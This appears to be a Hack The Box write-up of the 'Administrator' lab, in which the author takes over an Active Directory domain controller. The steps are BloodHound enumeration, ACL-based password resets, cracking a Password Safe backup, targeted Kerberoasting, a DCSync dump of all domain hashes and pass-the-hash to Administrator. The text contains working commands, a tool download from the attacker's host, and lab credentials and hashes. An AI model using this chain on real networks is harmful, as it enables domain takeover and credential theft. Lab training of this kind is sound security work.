---
created: 2026-10-13
updated: 2026-10-15
---

Username: `Olivia` Password: `ichliebedich`

---

## Recon

```bash
sudo nmap -sV -p- administrator.htb 
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-12 10:43 EDT
Nmap scan report for administrator.htb (10.129.75.15)
Host is up (0.076s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-12 21:45:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50813/tcp open  msrpc         Microsoft Windows RPC
50820/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50825/tcp open  msrpc         Microsoft Windows RPC
50828/tcp open  msrpc         Microsoft Windows RPC
50845/tcp open  msrpc         Microsoft Windows RPC
50878/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.61 seconds
```

- The host is apparently a DC.
- Connect via WinRM with the provided credentials:



To get the domain, query RootDSE:

```bash
ldapsearch -x -LLL -H ldap://10.129.75.222 -b '' -s base '(objectClass=*)'
```
```bash
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=administrator,DC=htb
ldapServiceName: administrator.htb:dc$@ADMINISTRATOR.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=administrator,DC
 =htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=administrator,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=administrator,DC=htb
namingContexts: DC=administrator,DC=htb
namingContexts: CN=Configuration,DC=administrator,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=administrator,DC=htb
namingContexts: DC=DomainDnsZones,DC=administrator,DC=htb
namingContexts: DC=ForestDnsZones,DC=administrator,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 135250
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=administrator,DC=htb
dnsHostName: dc.administrator.htb
defaultNamingContext: DC=administrator,DC=htb
currentTime: 20261014163714.0Z
configurationNamingContext: CN=Configuration,DC=administrator,DC=htb
```

Gather data using `BloodHound.py`:


```bash
./bloodhound.py -u 'Olivia' -p 'ichliebedich' -d administrator.htb -ns 10.129.75.222 -c All
```
```bash
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 27S

```







BloodHound shows that the owned user `Olivia` has `GenericAll` over the user `Michael`.
Compromise the user:

```bash
net rpc password 'Michael' 'passwd123' -U 'administrator.htb'/'Olivia%ichliebedich' -S 10.129.75.222

```

```bash
nxc ldap 10.129.75.222 -u 'Michael' -p 'passwd123'
LDAP        10.129.75.222   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.75.222   389    DC               [+] administrator.htb\Michael:passwd123 

```

Next, `Michael` has `ForceChangePassword` for `Benjamin`. Perform the same operation using `Michael`’s credentials:

```bash

net rpc password 'Benjamin' 'passwd123' -U 'administrator.htb'/'Michael%passwd123' -S 10.129.75.222
```
```bash
nxc ldap 10.129.75.222 -u 'Benjamin' -p 'passwd123'
LDAP        10.129.75.222   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.75.222   389    DC               [+] administrator.htb\Benjamin:passwd12
```

`Benjamin` is, in turn, a member of the `Share Moderators` group.
However, there is currently no direct path to `Domain Admins`. 
I then enumerated shares as both users, but haven’t found anything worthy `Michael` or `Benjamin` can read. 
Then I recalled the FTP service listening on the DC and connected as `Bejamin`:

```bash
ftp benjamin@10.129.75.222
Connected to 10.129.75.222.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||58310|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||58313|)
125 Data connection already open; Transfer starting.
100% |*********************************************************************************|   952       31.57 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (30.91 KiB/s)
ftp> 

```

Convert `Backup.psafe3` to the format JohnTheRipper can work with:

```bash
pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050

```

Crack the hash:

```bash
john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-10-14 10:43) 2.631g/s 16168p/s 16168c/s 16168C/s 123456..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Passwords from the database:

Alexander Smith: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily Rodrigues: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma Johnson: WwANQWnmJnGV07WQN8bMS7FMAbjNur

Evil-WinRM as Emily:

```bash
evil-winrm -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -i 10.129.75.222
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> 

```

Get the user flag. 
Finally, there is a path between `Emily` and `Domain Admins`. 


First, `Emily` has `GenericWrite` over `Ethan`:




From `WinRM` as `Emily`:


```bash
python3 targetedkerberoast.py –dc-ip 10.129.75.222 -d administrator.htb -u emily -p ‘UXLCI5iETUsIBoFVTj8yQFKoHjXmb’ -U ethan
```

# drafts



```powershell
*Evil-WinRM* PS C:\Users\emily\Documents> setspn -S 

nonexistent/eth01.administrator.htb ADMINISTRATOR.HTB\Ethan
Checking domain DC=administrator,DC=htb

Registering ServicePrincipalNames for CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
	nonexistent/eth01.administrator.htb
Updated object

```

Verify:

```powershell
*Evil-WinRM* PS C:\Users\emily\Documents> setspn -Q nonexistent/eth01.administrator.htb
Checking domain DC=administrator,DC=htb
CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
	nonexistent/eth01.administrator.htb

Existing SPN found!
```

Import necessary tools:
```powershell
*Evil-WinRM* PS C:\Users\emily\Documents> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\Users\emily\Documents> Invoke-WebRequest -Uri http://10.10.15.70:8082/PowerView.ps1 -OutFile PowerView.ps1
*Evil-WinRM* PS C:\Users\emily\Documents> Import-Module PowerView.ps1

```

```bash
python3 ./targetedKerberoast.py --dc-ip 10.129.75.222 -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt -o hashes.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from file
[+] Writing hash to file for (ethan)
(.venv)
```
```bash
cat hashes.txt
krb5tgs23*ethanADMINISTRATOR.HTBadministrator.htb/ethan*d2f8aa0d6ee850e1886db495d79f5223$78b246237c17b6de7d9534ad57fa23cf2d76936824da8401d6b89cc0c645521f4d5891c95b813039eccfb13791d9888dabd2d02559c1a1506cd1e6d3cb9d7a2d371468f7bf686db8222e8c9dc985333463361b73be2cbf80f10c80724a047705326b7e5db437b85073b5041cc159fbbe3029052c46641b4e54187a9998b6ae8ce8c8a9d0bdba5e8616a6faeb6e6434c97f90fa05fab08faa06f5bef19c4b3d4779639e7a235db71ff5d90602bf8e59924b07354d4ce38a7ab89b9c9c4c0199129a4f5197415cf17f7259b81d75697d01eb64cc38bfde453ee6276cbe8e8039814d99719a84b4674517a81643a96c03841733445e4e330197b1d64aaa7c060fc324936d6306ed705dd7363655b85b1c146bf13f4643dcbb16728a4ffbdb58b4f37202a46f5ea2522cd16348b71dba458ca677bb348ea1e00133b110b8bd306e3b6170b19a5917606ef112725f80e057a0520fcea487f211a6a3e76601864c7e8391d9291cd2fbef966ce42880add60b0ef43ec500fa862f362f3c31deea1179bf0b3b7bd1d964a4f9ce79c4503d02f24482b68e65e4a684bea791cf16581f6feb1614294b3f7694220d95bac2d56c41a84df9e6a0c6b220397b0c03aa7fb001db211e11ab87227aaaf5bf83863406ce1ea9b44cbfd79d263e0a777f4310225b9ce6ad7f7fb7990929c2c7bc440498bbea8083684ba7dd5ddb3da067193b9ade8c0d3683971bca8e44c2acf209b6fa880f7f3b9428208b0b3039c69150b5a66fb83933c688ba5b400b653f1b0b9ac00cec02cb20d46ed66fb8d9f2f58d7e6ff97bab6f8f642f0ce84aff53908119394355873cbe43af3ae38c9deba37f9fc005c0620b2c96e536efa477234d57571f30159acada7db9d3c55156dcc7da9f409f947b613827ec36c6bfe87152713154911e64dc12441d17c6b96062d56ba307b41e8e0ea75b10d97ab4052967500dae060d2e6205c0c5889a8edefa18e8670c1418e2133a45682938ea767708aa9ac2697d02b513ee75f5732bc61f3798763e5331297f3df885d03ebfe66abbaf8e21906770b37b0bc4bacfc8ffd191a3ce92f1263589b59b6a3aa88453dbec25c341b355d2459f022422419d925adb63af38fe44f504264b935368319789e51abf81088a5f4de950a4130f73a87dcc2ee94a7aefca868862eea42e674492e2f4e67846c62ace7297358a8ec8cc9eb9bdedd2a9fa776f37ad656f4da2b0a295c2f36baad1c0f9d9df0c59eb3e257536f9bf0c090c19204cc624e42758583260c641ad58b997d9c16173c5e692747ddc08fb9bd9ecbaeac53987ff2ab452979e26de6725c6b5f368dc10b1aec4310a65ff2d48cc8410c297010c08d998e02a52b12afccbd6809d8a434310d8ce3e245c930e2fcf72d3e54a41db05a6542018bed0b9fcac389ef1acca466174fd88e33241cedd823211e4f36c7353cb2e394f90f46c183e9626c935a4897d1704bc49fe9bbb25db2c9130bf9a7111434d7f1a1a1c921317ade2ad946a58cb06be265c5ecbc66c29

```

```bash
hashcat -a 0 -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 5 125U, 2914/5893 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

krb5tgs23*ethanADMINISTRATOR.HTBadministrator.htb/ethan*d2f8aa0d6ee850e1886db495d79f5223$78b246237c17b6de7d9534ad57fa23cf2d76936824da8401d6b89cc0c645521f4d5891c95b813039eccfb13791d9888dabd2d02559c1a1506cd1e6d3cb9d7a2d371468f7bf686db8222e8c9dc985333463361b73be2cbf80f10c80724a047705326b7e5db437b85073b5041cc159fbbe3029052c46641b4e54187a9998b6ae8ce8c8a9d0bdba5e8616a6faeb6e6434c97f90fa05fab08faa06f5bef19c4b3d4779639e7a235db71ff5d90602bf8e59924b07354d4ce38a7ab89b9c9c4c0199129a4f5197415cf17f7259b81d75697d01eb64cc38bfde453ee6276cbe8e8039814d99719a84b4674517a81643a96c03841733445e4e330197b1d64aaa7c060fc324936d6306ed705dd7363655b85b1c146bf13f4643dcbb16728a4ffbdb58b4f37202a46f5ea2522cd16348b71dba458ca677bb348ea1e00133b110b8bd306e3b6170b19a5917606ef112725f80e057a0520fcea487f211a6a3e76601864c7e8391d9291cd2fbef966ce42880add60b0ef43ec500fa862f362f3c31deea1179bf0b3b7bd1d964a4f9ce79c4503d02f24482b68e65e4a684bea791cf16581f6feb1614294b3f7694220d95bac2d56c41a84df9e6a0c6b220397b0c03aa7fb001db211e11ab87227aaaf5bf83863406ce1ea9b44cbfd79d263e0a777f4310225b9ce6ad7f7fb7990929c2c7bc440498bbea8083684ba7dd5ddb3da067193b9ade8c0d3683971bca8e44c2acf209b6fa880f7f3b9428208b0b3039c69150b5a66fb83933c688ba5b400b653f1b0b9ac00cec02cb20d46ed66fb8d9f2f58d7e6ff97bab6f8f642f0ce84aff53908119394355873cbe43af3ae38c9deba37f9fc005c0620b2c96e536efa477234d57571f30159acada7db9d3c55156dcc7da9f409f947b613827ec36c6bfe87152713154911e64dc12441d17c6b96062d56ba307b41e8e0ea75b10d97ab4052967500dae060d2e6205c0c5889a8edefa18e8670c1418e2133a45682938ea767708aa9ac2697d02b513ee75f5732bc61f3798763e5331297f3df885d03ebfe66abbaf8e21906770b37b0bc4bacfc8ffd191a3ce92f1263589b59b6a3aa88453dbec25c341b355d2459f022422419d925adb63af38fe44f504264b935368319789e51abf81088a5f4de950a4130f73a87dcc2ee94a7aefca868862eea42e674492e2f4e67846c62ace7297358a8ec8cc9eb9bdedd2a9fa776f37ad656f4da2b0a295c2f36baad1c0f9d9df0c59eb3e257536f9bf0c090c19204cc624e42758583260c641ad58b997d9c16173c5e692747ddc08fb9bd9ecbaeac53987ff2ab452979e26de6725c6b5f368dc10b1aec4310a65ff2d48cc8410c297010c08d998e02a52b12afccbd6809d8a434310d8ce3e245c930e2fcf72d3e54a41db05a6542018bed0b9fcac389ef1acca466174fd88e33241cedd823211e4f36c7353cb2e394f90f46c183e9626c935a4897d1704bc49fe9bbb25db2c9130bf9a7111434d7f1a1a1c921317ade2ad946a58cb06be265c5ecbc66c29:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: krb5tgs23*ethanADMINISTRATOR.HTB$administrator....c66c29
Time.Started.....: Thu Oct 15 11:06:18 2026 (0 secs)
Time.Estimated...: Thu Oct 15 11:06:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   918.1 kH/s (1.70ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adriano -> iheartyou

Started: Thu Oct 15 11:06:15 2026
Stopped: Thu Oct 15 11:06:20 2026

```




Perform DCSync:

```bash
impacket-secretsdump -outputfile hashes.txt -just-dc ADMINISTRATOR.HTB/ethan@10.129.75.222
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
```

```bash
Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:d503a8571a79baf9b951884f350ad048:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:d503a8571a79baf9b951884f350ad048:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:f64b481150ac2147bb95306741963dae37af893de4d1eab1c86d27b215d30666
administrator.htb\michael:aes128-cts-hmac-sha1-96:c5451ed530d620c64ccda558a0e1a84a
administrator.htb\michael:des-cbc-md5:19e0ad856ef2915e
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:aa6e8a30fae4f5518f705f18d534b81466eacbd1870819af5f4affce1914df58
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:7ebc1816a063e1e2f90d9f13c5195232
administrator.htb\benjamin:des-cbc-md5:fb0d86704c851c04
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

Use the `Administrator`’s hash to perform the Pass-the-Hash attack and log in:


```bash
evil-winrm -i 10.129.75.222 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator

```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f6446cea001891efcdebf9a3d29adbae

```
